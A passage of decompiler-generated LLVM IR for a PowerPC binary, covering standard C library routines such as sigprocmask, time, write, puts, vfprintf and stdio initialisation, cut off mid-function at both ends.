  %v0_10008730 = call i32 @__asm_mfcr()
  %v1_10008734 = and i32 %v0_10008730, 268435456
  %v3_10008734 = icmp eq i32 %v1_10008734, 0
  store i32 %v0_10008730, i32* %r31.global-to-local, align 4
  br i1 %v3_10008734, label %dec_label_pc_1000874c, label %dec_label_pc_10008740

dec_label_pc_10008740:                            ; preds = %entry
  %v0_10008740 = call i32 @__errno_location()
  %v0_10008744 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008744 = inttoptr i32 %v0_10008740 to i32*
  store i32 %v0_10008744, i32* %v2_10008744, align 4
  br label %dec_label_pc_1000874c

dec_label_pc_1000874c:                            ; preds = %entry, %dec_label_pc_10008740
  %v0_1000875c = phi i32 [ %v0_10008730, %entry ], [ -1, %dec_label_pc_10008740 ]
  ret i32 %v0_1000875c

; uselistorder directives
  uselistorder label %dec_label_pc_1000874c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_10008760 = icmp eq i32 %arg2, 0
  br i1 %v3_10008760, label %dec_label_pc_100087a0, label %dec_label_pc_10008788

dec_label_pc_10008788:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_100087a0, label %dec_label_pc_10008790

dec_label_pc_10008790:                            ; preds = %dec_label_pc_10008788
  %v0_10008790 = call i32 @__errno_location()
  %v2_10008798 = inttoptr i32 %v0_10008790 to i32*
  store i32 22, i32* %v2_10008798, align 4
  %v0_100087c4.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100087c0

dec_label_pc_100087a0:                            ; preds = %dec_label_pc_10008788, %entry
  %v0_100087a4 = call i32 @__asm_mfcr()
  %v1_100087a8 = and i32 %v0_100087a4, 268435456
  %v3_100087a8 = icmp eq i32 %v1_100087a8, 0
  store i32 %v0_100087a4, i32* %r31.global-to-local, align 4
  br i1 %v3_100087a8, label %dec_label_pc_100087c0, label %dec_label_pc_100087b4

dec_label_pc_100087b4:                            ; preds = %dec_label_pc_100087a0
  %v0_100087b4 = call i32 @__errno_location()
  %v0_100087b8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100087b8 = inttoptr i32 %v0_100087b4 to i32*
  store i32 %v0_100087b8, i32* %v2_100087b8, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100087c0

dec_label_pc_100087c0:                            ; preds = %dec_label_pc_100087a0, %dec_label_pc_10008790, %dec_label_pc_100087b4
  %v0_100087c4 = phi i32 [ %v0_100087a4, %dec_label_pc_100087a0 ], [ %v0_100087c4.pre, %dec_label_pc_10008790 ], [ -1, %dec_label_pc_100087b4 ]
  ret i32 %v0_100087c4

; uselistorder directives
  uselistorder label %dec_label_pc_100087c0, { 2, 0, 1 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100087f0 = call i32 @__asm_mfcr()
  %v1_100087f4 = and i32 %v0_100087f0, 268435456
  %v3_100087f4 = icmp eq i32 %v1_100087f4, 0
  store i32 %v0_100087f0, i32* %r31.global-to-local, align 4
  br i1 %v3_100087f4, label %dec_label_pc_1000880c, label %dec_label_pc_10008800

dec_label_pc_10008800:                            ; preds = %entry
  %v0_10008800 = call i32 @__errno_location()
  %v0_10008804 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008804 = inttoptr i32 %v0_10008800 to i32*
  store i32 %v0_10008804, i32* %v2_10008804, align 4
  br label %dec_label_pc_1000880c

dec_label_pc_1000880c:                            ; preds = %entry, %dec_label_pc_10008800
  %v0_1000881c = phi i32 [ %v0_100087f0, %entry ], [ -1, %dec_label_pc_10008800 ]
  ret i32 %v0_1000881c

; uselistorder directives
  uselistorder label %dec_label_pc_1000880c, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10008824 = call i32 @wait4(i32 0)
  ret i32 %v1_10008824
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10008840 = call i32 @__asm_mfcr()
  %v1_10008844 = and i32 %v0_10008840, 268435456
  %v3_10008844 = icmp eq i32 %v1_10008844, 0
  store i32 %v0_10008840, i32* %r31.global-to-local, align 4
  br i1 %v3_10008844, label %dec_label_pc_1000885c, label %dec_label_pc_10008850

dec_label_pc_10008850:                            ; preds = %entry
  %v0_10008850 = call i32 @__errno_location()
  %v0_10008854 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008854 = inttoptr i32 %v0_10008850 to i32*
  store i32 %v0_10008854, i32* %v2_10008854, align 4
  br label %dec_label_pc_1000885c

dec_label_pc_1000885c:                            ; preds = %entry, %dec_label_pc_10008850
  %v0_1000886c = phi i32 [ %v0_10008840, %entry ], [ -1, %dec_label_pc_10008850 ]
  ret i32 %v0_1000886c

; uselistorder directives
  uselistorder label %dec_label_pc_1000885c, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10008874 = mul i32 %arg1, 2
  %v3_10008878 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32 -664) to i32*), align 4
  %v2_1000887c = add i32 %v3_10008878, %v1_10008874
  %v3_1000887c = inttoptr i32 %v2_1000887c to i16*
  %v4_1000887c = load i16, i16* %v3_1000887c, align 2
  %v5_1000887c = zext i16 %v4_1000887c to i32
  %v1_10008880 = call i32 @__asm_rlwinm(i32 %v5_1000887c, i32 0, i32 26, i32 26)
  ret i32 %v1_10008880
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10008888 = add i32 %arg1, 128
  %v1_1000888c = mul i32 %arg1, 2
  %v2_10008890 = icmp ugt i32 %v1_10008888, 383
  %v0_10008894 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10008890, i32 %v0_10008894)
  %v3_1000889c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32 -656) to i32*), align 4
  %v2_100088a0 = add i32 %v1_1000888c, %v3_1000889c
  %v3_100088a0 = inttoptr i32 %v2_100088a0 to i16*
  %v4_100088a0 = load i16, i16* %v3_100088a0, align 2
  %v5_100088a0 = sext i16 %v4_100088a0 to i32
  ret i32 %v5_100088a0
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1001fdec.171 to i32)
}

define i32 @puts(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v2_100088d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100088d4, i32* @r3, align 4
  %v3_100088d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32 -648) to i32*), align 4
  store i32 %v3_100088d8, i32* %r30.global-to-local, align 4
  %v1_100088dc = add i32 %v3_100088d8, 52
  %v2_100088dc = inttoptr i32 %v1_100088dc to i32*
  %v3_100088dc = load i32, i32* %v2_100088dc, align 4
  %v1_100088e0 = add i32 %v3_100088d8, 56
  store i32 %v1_100088e0, i32* %r31.global-to-local, align 4
  %v3_100088e8 = icmp eq i32 %v3_100088dc, 0
  br i1 %v3_100088e8, label %dec_label_pc_100088f0, label %dec_label_pc_100088fc

dec_label_pc_100088f0:                            ; preds = %entry
  %v0_100088f0 = call i32 @__pthread_return_void()
  %v0_100088f8 = call i32 @__pthread_return_0()
  %v0_100088fc.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_10008900.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100088fc

dec_label_pc_100088fc:                            ; preds = %entry, %dec_label_pc_100088f0
  %v0_10008900 = phi i32 [ %arg1, %entry ], [ %v0_10008900.pre, %dec_label_pc_100088f0 ]
  %v0_100088fc = phi i32 [ %v3_100088d8, %entry ], [ %v0_100088fc.pre, %dec_label_pc_100088f0 ]
  store i32 268470536, i32* @lr, align 4
  %v2_10008904 = call i32 @__GI_fputs_unlocked(i32 %v0_10008900, i32 %v0_100088fc)
  %v0_10008908 = load i32, i32* @r30, align 4
  store i32 %v2_10008904, i32* %r31.global-to-local, align 4
  %v3_10008914 = icmp eq i32 %v2_10008904, -1
  br i1 %v3_10008914, label %dec_label_pc_10008930, label %dec_label_pc_1000891c

dec_label_pc_1000891c:                            ; preds = %dec_label_pc_100088fc
  store i32 268470560, i32* @lr, align 4
  %v3_1000891c = call i32 @putc_unlocked(i8 10, i32 %v0_10008908)
  %v0_10008920 = load i32, i32* @r31, align 4
  %v1_10008920 = add i32 %v0_10008920, 1
  store i32 %v1_10008920, i32* %r31.global-to-local, align 4
  %v3_10008924 = icmp eq i32 %v3_1000891c, -1
  br i1 %v3_10008924, label %dec_label_pc_1000892c, label %dec_label_pc_10008930

dec_label_pc_1000892c:                            ; preds = %dec_label_pc_1000891c
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008930

dec_label_pc_10008930:                            ; preds = %dec_label_pc_1000891c, %dec_label_pc_100088fc, %dec_label_pc_1000892c
  %v0_100089484 = phi i32 [ %v1_10008920, %dec_label_pc_1000891c ], [ -1, %dec_label_pc_100088fc ], [ -1, %dec_label_pc_1000892c ]
  %v0_10008930 = load i32, i32* @r28, align 4
  %v3_10008930 = icmp eq i32 %v0_10008930, 0
  store i32 %v2_100088d4, i32* @r3, align 4
  br i1 %v3_10008930, label %dec_label_pc_10008940, label %dec_label_pc_10008944

dec_label_pc_10008940:                            ; preds = %dec_label_pc_10008930
  %v0_10008940 = call i32 @__pthread_return_void()
  %v0_10008948.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008944

dec_label_pc_10008944:                            ; preds = %dec_label_pc_10008930, %dec_label_pc_10008940
  %v0_10008948 = phi i32 [ %v0_100089484, %dec_label_pc_10008930 ], [ %v0_10008948.pre, %dec_label_pc_10008940 ]
  ret i32 %v0_10008948

; uselistorder directives
  uselistorder i32* %r31.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_10008944, { 1, 0 }
  uselistorder label %dec_label_pc_10008930, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100088fc, { 1, 0 }
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32* @r28, align 4
  %v0_10008a04 = call i32 @__errno_location()
  store i32 %v0_10008a04, i32* @r26, align 4
  %v1_10008a10 = inttoptr i32 %v0_10008a04 to i32*
  %v2_10008a10 = load i32, i32* %v1_10008a10, align 4
  store i32 %v2_10008a10, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1001fa70.76 to i32), i32* @r27, align 4
  %v3_10008a18 = load i16, i16* @global_var_1001fa70.76, align 2
  %v4_10008a18 = zext i16 %v3_10008a18 to i32
  store i32 %v4_10008a18, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008a20.173 to i32), i32* @lr, align 4
  %v1_10008a1c = call i32 @isatty(i32 0)
  %v1_10008a20 = sub i32 1, %v1_10008a1c
  %v1_10008a24 = mul i32 %v1_10008a20, 256
  %v0_10008a28 = load i32, i32* @r29, align 4
  %v2_10008a28 = xor i32 %v1_10008a24, %v0_10008a28
  %v1_10008a30 = trunc i32 %v2_10008a28 to i16
  store i16 %v1_10008a30, i16* @global_var_1001fa70.76, align 2
  %v3_10008a34 = load i16, i16* @global_var_1001fac0.77, align 2
  %v4_10008a34 = zext i16 %v3_10008a34 to i32
  store i32 %v4_10008a34, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008a3c.174 to i32), i32* @lr, align 4
  %v1_10008a38 = call i32 @isatty(i32 1)
  %v1_10008a3c = sub i32 1, %v1_10008a38
  %v1_10008a40 = mul i32 %v1_10008a3c, 256
  %v0_10008a44 = load i32, i32* @r29, align 4
  %v2_10008a44 = xor i32 %v1_10008a40, %v0_10008a44
  %v1_10008a48 = trunc i32 %v2_10008a44 to i16
  store i16 %v1_10008a48, i16* @global_var_1001fac0.77, align 2
  %v0_10008a4c = load i32, i32* @r25, align 4
  %v1_10008a4c = load i32, i32* @r26, align 4
  %v2_10008a4c = inttoptr i32 %v1_10008a4c to i32*
  store i32 %v0_10008a4c, i32* %v2_10008a4c, align 4
  ret i32 %v1_10008a40

; uselistorder directives
  uselistorder i32 %v1_10008a40, { 1, 0 }
  uselistorder i16* @global_var_1001fac0.77, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000ea98.175 to i32), i32* @r4, align 4
  %v0_10008a70 = call i32 @memcpy()
  ret i32 %v0_10008a70
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001fa40.176 to i32), i32* @r3, align 4
  store i32 268470928, i32* @lr, align 4
  %v0_10008a8c = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1001fa58.177 to i32), i32* @r3, align 4
  store i32 268470940, i32* @lr, align 4
  %v0_10008a98 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1001fd88.178 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_10008ae49 = icmp eq i32 %storemerge6, 0
  %v1_10008ae811 = add i32 %storemerge6, 56
  store i32 %v1_10008ae811, i32* %r30.global-to-local, align 4
  br i1 %v3_10008ae49, label %dec_label_pc_10008af4, label %dec_label_pc_10008aa8

dec_label_pc_10008aa8:                            ; preds = %entry, %dec_label_pc_10008ad4
  %v0_10008aa8 = call i32 @__pthread_return_0()
  %v3_10008aac = icmp eq i32 %v0_10008aa8, 0
  %v0_10008ab0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10008ab0, i32* @r3, align 4
  br i1 %v3_10008aac, label %dec_label_pc_10008ad4, label %dec_label_pc_10008ab8

dec_label_pc_10008ab8:                            ; preds = %dec_label_pc_10008aa8
  %v0_10008ab8 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008ab8 = add i32 %v0_10008ab8, 8
  %v2_10008ab8 = inttoptr i32 %v1_10008ab8 to i32*
  %v3_10008ab8 = load i32, i32* %v2_10008ab8, align 4
  store i32 %v3_10008ab8, i32* %r9.global-to-local, align 4
  %v3_10008ac0 = inttoptr i32 %v0_10008ab8 to i16*
  store i16 48, i16* %v3_10008ac0, align 2
  %v0_10008ac4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008ac4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008ac4 = add i32 %v1_10008ac4, 20
  %v3_10008ac4 = inttoptr i32 %v2_10008ac4 to i32*
  store i32 %v0_10008ac4, i32* %v3_10008ac4, align 4
  %v0_10008ac8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008ac8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008ac8 = add i32 %v1_10008ac8, 24
  %v3_10008ac8 = inttoptr i32 %v2_10008ac8 to i32*
  store i32 %v0_10008ac8, i32* %v3_10008ac8, align 4
  %v0_10008acc = load i32, i32* %r9.global-to-local, align 4
  %v1_10008acc = load i32, i32* %r31.global-to-local, align 4
  %v2_10008acc = add i32 %v1_10008acc, 28
  %v3_10008acc = inttoptr i32 %v2_10008acc to i32*
  store i32 %v0_10008acc, i32* %v3_10008acc, align 4
  %v0_10008ad0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008ad0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008ad0 = add i32 %v1_10008ad0, 16
  %v3_10008ad0 = inttoptr i32 %v2_10008ad0 to i32*
  store i32 %v0_10008ad0, i32* %v3_10008ad0, align 4
  br label %dec_label_pc_10008ad4

dec_label_pc_10008ad4:                            ; preds = %dec_label_pc_10008aa8, %dec_label_pc_10008ab8
  %v1_10008ad8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008ad8 = add i32 %v1_10008ad8, 52
  %v3_10008ad8 = inttoptr i32 %v2_10008ad8 to i32*
  store i32 1, i32* %v3_10008ad8, align 4
  store i32 268471008, i32* @lr, align 4
  %v0_10008adc = call i32 @__stdio_init_mutex()
  %v0_10008ae0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008ae0 = add i32 %v0_10008ae0, 32
  %v2_10008ae0 = inttoptr i32 %v1_10008ae0 to i32*
  %storemerge = load i32, i32* %v2_10008ae0, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_10008ae4 = icmp eq i32 %storemerge, 0
  %v1_10008ae8 = add i32 %storemerge, 56
  store i32 %v1_10008ae8, i32* %r30.global-to-local, align 4
  br i1 %v3_10008ae4, label %dec_label_pc_10008ae4.dec_label_pc_10008af4_crit_edge, label %dec_label_pc_10008aa8

dec_label_pc_10008ae4.dec_label_pc_10008af4_crit_edge: ; preds = %dec_label_pc_10008ad4
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1001fd88.178 to i32*), align 4
  br label %dec_label_pc_10008af4

dec_label_pc_10008af4:                            ; preds = %dec_label_pc_10008ae4.dec_label_pc_10008af4_crit_edge, %entry
  %v0_10008b3016 = phi i32 [ %v1_10008ae8, %dec_label_pc_10008ae4.dec_label_pc_10008af4_crit_edge ], [ %v1_10008ae811, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_10008ae4.dec_label_pc_10008af4_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32* @global_var_10020000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_10008b185 = icmp eq i32 %storemerge12, 0
  br i1 %v3_10008b185, label %dec_label_pc_10008b20, label %dec_label_pc_10008b00

dec_label_pc_10008b00:                            ; preds = %dec_label_pc_10008af4, %dec_label_pc_10008b14
  %v0_10008b10 = phi i32 [ %storemerge1, %dec_label_pc_10008b14 ], [ %storemerge12, %dec_label_pc_10008af4 ]
  %v1_10008b00 = inttoptr i32 %v0_10008b10 to i16*
  %v2_10008b00 = load i16, i16* %v1_10008b00, align 2
  %v3_10008b00 = zext i16 %v2_10008b00 to i32
  %v1_10008b08 = and i32 %v3_10008b00, 64
  store i32 %v1_10008b08, i32* %r9.global-to-local, align 4
  %v3_10008b08 = icmp eq i32 %v1_10008b08, 0
  br i1 %v3_10008b08, label %dec_label_pc_10008b14, label %dec_label_pc_10008b10

dec_label_pc_10008b10:                            ; preds = %dec_label_pc_10008b00
  store i32 268471060, i32* @lr, align 4
  %v1_10008b10 = call i32 @__stdio_wcommit(i32 %v0_10008b10)
  %v0_10008b14.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008b14

dec_label_pc_10008b14:                            ; preds = %dec_label_pc_10008b00, %dec_label_pc_10008b10
  %v0_10008b14 = phi i32 [ %v0_10008b10, %dec_label_pc_10008b00 ], [ %v0_10008b14.pre, %dec_label_pc_10008b10 ]
  %v0_10008b3017 = phi i32 [ %v0_10008b10, %dec_label_pc_10008b00 ], [ %v1_10008b10, %dec_label_pc_10008b10 ]
  %v1_10008b14 = add i32 %v0_10008b14, 32
  %v2_10008b14 = inttoptr i32 %v1_10008b14 to i32*
  %storemerge1 = load i32, i32* %v2_10008b14, align 4
  store i32 %storemerge1, i32* @r31, align 4
  %v3_10008b18 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10008b18, label %dec_label_pc_10008b20, label %dec_label_pc_10008b00

dec_label_pc_10008b20:                            ; preds = %dec_label_pc_10008b14, %dec_label_pc_10008af4
  %v0_10008b30 = phi i32 [ %v0_10008b3016, %dec_label_pc_10008af4 ], [ %v0_10008b3017, %dec_label_pc_10008b14 ]
  ret i32 %v0_10008b30

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32* %r31.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r30.global-to-local, { 2, 1, 0 }
  uselistorder i16* @global_var_1001fa70.76, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008b14, { 1, 0 }
  uselistorder label %dec_label_pc_10008b00, { 1, 0 }
  uselistorder label %dec_label_pc_10008ad4, { 1, 0 }
  uselistorder label %dec_label_pc_10008aa8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10008b3c = load i32, i32* @r31, align 4
  %v1_10008b48 = add i32 %arg1, 8
  %v2_10008b48 = inttoptr i32 %v1_10008b48 to i32*
  %v3_10008b48 = load i32, i32* %v2_10008b48, align 4
  %v1_10008b4c = add i32 %arg1, 16
  %v2_10008b4c = inttoptr i32 %v1_10008b4c to i32*
  %v3_10008b4c = load i32, i32* %v2_10008b4c, align 4
  %v2_10008b54 = sub i32 %v3_10008b4c, %v3_10008b48
  store i32 %v2_10008b54, i32* @r5, align 4
  %v5_10008b54 = icmp eq i32 %v2_10008b54, 0
  br i1 %v5_10008b54, label %dec_label_pc_10008b64, label %dec_label_pc_10008b5c

dec_label_pc_10008b5c:                            ; preds = %entry
  store i32 %v3_10008b48, i32* %v2_10008b4c, align 4
  store i32 268471140, i32* @lr, align 4
  %v2_10008b60 = inttoptr i32 %v3_10008b48 to i16*
  %v3_10008b60 = call i32 @__stdio_WRITE(i16* %v2_10008b60, i32 %v2_10008b54)
  %v0_10008b64.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008b64

dec_label_pc_10008b64:                            ; preds = %entry, %dec_label_pc_10008b5c
  %v0_10008b64 = phi i32 [ %arg1, %entry ], [ %v0_10008b64.pre, %dec_label_pc_10008b5c ]
  %v1_10008b64 = add i32 %v0_10008b64, 8
  %v2_10008b64 = inttoptr i32 %v1_10008b64 to i32*
  %v3_10008b64 = load i32, i32* %v2_10008b64, align 4
  %v1_10008b68 = add i32 %v0_10008b64, 16
  %v2_10008b68 = inttoptr i32 %v1_10008b68 to i32*
  %v3_10008b68 = load i32, i32* %v2_10008b68, align 4
  store i32 %v0_10008b3c, i32* @r31, align 4
  %v2_10008b70 = sub i32 %v3_10008b68, %v3_10008b64
  ret i32 %v2_10008b70

; uselistorder directives
  uselistorder i32 %v0_10008b64, { 1, 0 }
  uselistorder i32 %v3_10008b48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008b64, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10008ba4 = add i32 %tmp, 52
  %v3_10008ba4 = inttoptr i32 %v2_10008ba4 to i32*
  %v4_10008ba4 = load i32, i32* %v3_10008ba4, align 4
  store i32 %v4_10008ba4, i32* @r28, align 4
  store i32 %arg3, i32* @r27, align 4
  %v2_10008bac = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10008bac, i32* @r3, align 4
  %v3_10008bb4 = icmp eq i32 %v4_10008ba4, 0
  br i1 %v3_10008bb4, label %dec_label_pc_10008bc0, label %dec_label_pc_10008bcc

dec_label_pc_10008bc0:                            ; preds = %entry
  %v0_10008bc0 = call i32 @__pthread_return_void()
  %v0_10008bc8 = call i32 @__pthread_return_0()
  %v0_10008bcc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008bcc

dec_label_pc_10008bcc:                            ; preds = %entry, %dec_label_pc_10008bc0
  %v0_10008bcc = phi i32 [ %tmp, %entry ], [ %v0_10008bcc.pre, %dec_label_pc_10008bc0 ]
  %v1_10008bcc = inttoptr i32 %v0_10008bcc to i16*
  %v2_10008bcc = load i16, i16* %v1_10008bcc, align 2
  %v3_10008bcc = zext i16 %v2_10008bcc to i32
  store i32 128, i32* @r4, align 4
  store i32 %v0_10008bcc, i32* @r3, align 4
  store i32 -1, i32* @r30, align 4
  %v1_10008bdc = call i32 @__asm_rlwinm(i32 %v3_10008bcc, i32 0, i32 24, i32 25)
  %v3_10008be0 = icmp eq i32 %v1_10008bdc, 192
  br i1 %v3_10008be0, label %dec_label_pc_10008bf4, label %dec_label_pc_10008be8

dec_label_pc_10008be8:                            ; preds = %dec_label_pc_10008bcc
  store i32 268471276, i32* @lr, align 4
  %v0_10008be8 = call i32 @__stdio_trans2w_o()
  %v3_10008bec = icmp eq i32 %v0_10008be8, 0
  br i1 %v3_10008bec, label %dec_label_pc_10008bf4, label %dec_label_pc_10008c08

dec_label_pc_10008bf4:                            ; preds = %dec_label_pc_10008be8, %dec_label_pc_10008bcc
  %v0_10008bf4 = load i32, i32* @r29, align 4
  %v0_10008bf8 = load i32, i32* @r27, align 4
  %v0_10008bfc = load i32, i32* @r31, align 4
  store i32 268471300, i32* @lr, align 4
  %v4_10008c00 = inttoptr i32 %v0_10008bf4 to i8*
  %v5_10008c00 = call i32 @_vfprintf_internal(i32 %v0_10008bfc, i8* %v4_10008c00, i32 %v0_10008bf8)
  store i32 %v5_10008c00, i32* @r30, align 4
  br label %dec_label_pc_10008c08

dec_label_pc_10008c08:                            ; preds = %dec_label_pc_10008be8, %dec_label_pc_10008bf4
  %v0_10008c08 = load i32, i32* @r28, align 4
  %v3_10008c08 = icmp eq i32 %v0_10008c08, 0
  store i32 %v2_10008bac, i32* @r3, align 4
  br i1 %v3_10008c08, label %dec_label_pc_10008c18, label %dec_label_pc_10008c1c

dec_label_pc_10008c18:                            ; preds = %dec_label_pc_10008c08
  %v0_10008c18 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10008c1c

dec_label_pc_10008c1c:                            ; preds = %dec_label_pc_10008c08, %dec_label_pc_10008c18
  %v0_10008c20 = load i32, i32* @r30, align 4
  ret i32 %v0_10008c20

; uselistorder directives
  uselistorder i32 %v0_10008bcc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008c1c, { 1, 0 }
  uselistorder label %dec_label_pc_10008c08, { 1, 0 }
  uselistorder label %dec_label_pc_10008bcc, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_10008c5c3 = icmp eq i32 %arg3, 0
  %v2_10008c60 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_10008c5c3, label %dec_label_pc_10008c7c, label %dec_label_pc_10008c70

dec_label_pc_10008c58:                            ; preds = %dec_label_pc_10008c70
  %v1_10008c58 = add i32 %v0_10008c58, -1
  store i32 %v1_10008c58, i32* @r31, align 4
  %v3_10008c5c = icmp eq i32 %v1_10008c58, 0
  %v0_10008c68 = load i32, i32* @r29, align 4
  br i1 %v3_10008c5c, label %dec_label_pc_10008c7c.loopexit, label %dec_label_pc_10008c70

dec_label_pc_10008c70:                            ; preds = %entry, %dec_label_pc_10008c58
  %v0_10008c685 = phi i32 [ %v0_10008c68, %dec_label_pc_10008c58 ], [ %arg1, %entry ]
  store i32 268471412, i32* @lr, align 4
  %v3_10008c70 = inttoptr i32 %v0_10008c685 to i16*
  %v4_10008c70 = call i32 @__stdio_fwrite(i32 %v2_10008c60, i32 1, i16* %v3_10008c70)
  %v3_10008c74 = icmp eq i32 %v4_10008c70, 1
  %v0_10008c58 = load i32, i32* @r31, align 4
  br i1 %v3_10008c74, label %dec_label_pc_10008c58, label %dec_label_pc_10008c7c.loopexit

dec_label_pc_10008c7c.loopexit:                   ; preds = %dec_label_pc_10008c58, %dec_label_pc_10008c70
  %v0_10008c80.ph = phi i32 [ %v0_10008c58, %dec_label_pc_10008c70 ], [ 0, %dec_label_pc_10008c58 ]
  %v1_10008c80.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10008c7c

dec_label_pc_10008c7c:                            ; preds = %dec_label_pc_10008c7c.loopexit, %entry
  %v1_10008c80 = phi i32 [ 0, %entry ], [ %v1_10008c80.pre, %dec_label_pc_10008c7c.loopexit ]
  %v0_10008c80 = phi i32 [ 0, %entry ], [ %v0_10008c80.ph, %dec_label_pc_10008c7c.loopexit ]
  %v2_10008c80 = sub i32 %v1_10008c80, %v0_10008c80
  ret i32 %v2_10008c80

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008c7c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10008c70, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
